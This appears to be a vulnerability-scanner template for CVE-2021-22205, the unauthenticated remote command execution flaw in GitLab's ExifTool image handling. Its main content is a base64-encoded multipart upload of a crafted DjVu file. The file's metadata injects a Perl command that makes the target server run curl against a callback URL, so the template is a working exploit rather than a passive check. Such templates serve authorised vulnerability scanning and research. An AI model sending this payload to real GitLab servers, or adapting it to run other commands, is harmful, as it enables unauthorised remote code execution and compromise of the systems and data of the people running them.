id: yaml-poc-gitlab-gitlab-rce-CVE-2021-22205
info:
  name: Yaml Poc Gitlab Gitlab Rce Cve 2021 22205
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-gitlab-gitlab-rce-CVE-2021-22205'
  tags: gitlab,rce,cve
  classification:
    cve-id: CVE-2021-22205
  reference:
  - http://packetstormsecurity.com/files/164768/GitLab-Unauthenticated-Remote-ExifTool-Command-Injection.html
  - http://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html
  - https://cxsecurity.com/issue/WLB-2021110075
  - https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22205.json
  - https://gitlab.com/gitlab-org/gitlab/-/issues/327121
http:
- method: GET
  path:
  - /users/sign_in
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /uploads/user
  body: !!binary |
    DQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlJTXYzbXhSZzU5VGtGU1g1DQpDb250ZW50LURpc3Bv
    c2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0idGVzdC5qcGciDQpDb250
    ZW50LVR5cGU6IGltYWdlL2pwZWcNCg0KQVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAA
    AKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAK
    AAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/
    KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgko
    Q29weXJpZ2h0ICJcCiIgLiBxeHtjdXJsIHt7cmV2ZXJzZVVSTH19fSAuIFwKIiBiICIpICkgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgCg0KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5SU12M214Umc1OVRr
    RlNYNS0tDQo=
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
    X-CSRF-Token: '{{csrftoken}}'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 422
